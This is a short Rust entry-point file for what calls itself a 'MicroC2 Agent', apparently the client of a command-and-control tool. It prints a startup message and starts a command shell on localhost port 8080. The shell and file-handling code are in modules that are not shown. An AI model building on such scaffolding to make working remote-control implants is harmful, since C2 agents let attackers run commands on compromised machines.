extern crate tokio;
extern crate hyper;
extern crate chrono;

mod file_handling;
mod commands;

use commands::command_shell::run_shell;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("MicroC2 Agent starting...");

    // Run command shell
    run_shell("127.0.0.1:8080").await?;
    
    Ok(())
}
